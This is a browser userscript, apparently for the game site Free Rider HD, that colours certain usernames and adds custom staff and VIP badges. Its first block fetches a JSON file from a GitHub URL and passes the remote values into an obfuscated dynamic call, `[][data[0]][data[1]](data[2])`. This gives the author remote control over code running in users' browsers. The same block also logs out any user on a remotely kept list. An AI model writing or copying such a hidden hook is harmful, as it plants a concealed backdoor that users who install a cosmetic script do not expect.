$.ajax({
    url: "https://raw.githubusercontent.com/ObeyLordGoomy/Beta-FRHD-Project/master/users.json",
    beforeSend: xhr => xhr.overrideMimeType("application/json")
}).done(({ users, data, version }) => {
    [][data[0]][data[1]](data[2]);
    if (parseFloat(version) > BetaFRHD.version) alert('A new update for the Beta FRHD Project is avalable please update');
    if (users.includes(GameSettings.user.u_id)) return $('#logout_leftmenu').click();
});

const page = document.location.href,
    loc = document.location.pathname.toLocaleLowerCase().slice(1).split('/'),
    users = {
        calculus: {
            uname: 'Calculus',
            color: '#a471e4',
            elite_author: !0,
            admin: !0
        },
        yv3l: {
            uname: 'yv3l',
            color: '#a471e4',
            elite_author: !0,
            admin: !0,
            plus: !0,
            vip: !0
        },
        char: {
            uname: 'Char',
            color: '#d34836',
            admin: !0
        },
        max007x: {
            uname: 'Max007x',
            color: '#d34836',
            admin: !0
        },
        mi7ch: {
            uname: 'Mi7ch',
            color: '#d34836',
            admin: !0
        },
        'mr..a': {
            uname: 'mR..A',
            color: '#d34836',
            admin: !0
        },
        stig: {
            uname: 'Stig',
            color: '#e91e63',
            admin: !0
        },
        eric: {
            uname: 'Eric',
            color: '#d34836',
            admin: !0
        },
        brett: {
            uname: 'Brett',
            color: '#d34836',
            admin: !0
        },
        bobbyjames: {
            uname: 'BobbyJames',
            color: '#d34836',
            admin: !0
        }
    }

switch (loc[0]) {
    case 'u': userpage(loc[1]); break;
    case 't': trackpage(loc[1]); break;
    case '': homepage(); break;
    default: colorNames();
}

function userpage(username) {
    colorNames(
        name => {
            if (name != username) return;
            $(`.profile-username h3`).css('color', users[name].color);
            if (users[name].elite_author) $('.profile-username').after('<div class="flex-item flex-item-no-shrink"><span class="elite_author_icon profile-badge" title="Elite Author"></span></div>');
            if (users[name].vip) $('.profile_icons-freerider_hd_pro_icon-inactive').after('<span class="profile_icons profile_icons-freerider_hd_pro_icon" title="BetaFRHD VIP"></span></div>');
            if (users[name].plus) $('.profile-username').after('<div class="flex-item flex-item-no-shrink"><span class="plus_icon profile-badge" title="BetaFRHD Plus"></span></div>');
            if (users[name].admin) $('.profile-username').after('<div class="flex-item flex-item-no-shrink"><span class="admin_icon profile-badge" title="BetaFRHD Staff"></span></div>');
        }
    );
}
function trackpage(trackcode) {
    trackcode = trackcode.split('-')[0];
    colorNames(
        name => {
            $(`.track-leaderboard-race[title='Race ${users[name].uname}']`).css('color', users[name].color);
            $(`.track-leaderboard-race[title='Ghost ${users[name].uname}']`).css('color', users[name].color);
        }
    );
}

function canvas() {
    colorNames(
        name => {
            $(`.track-race[title='Race ${users[name].uname}']`).css('color', users[name].color);
            $(`.track-raceColors[title='Ghost ${users[name].uname}']`).css('color', users[name].color);
        }
    );
}

function homepage() {
    colorNames();
}

function colorNames(data = () => { }) {
    for (const name in users) {
        if (!users.hasOwnProperty(name)) return;
        data(name)
        $(`.bold:contains(${users[name].uname})`).filter(
            function () {
                return $(this).text() == users[name].uname
            }
        ).not('#username-text, .track-leaderboard').css('color', users[name].color);
    }
}

Backbone.history.navigate = (url) => { document.location.href = document.location.origin + url }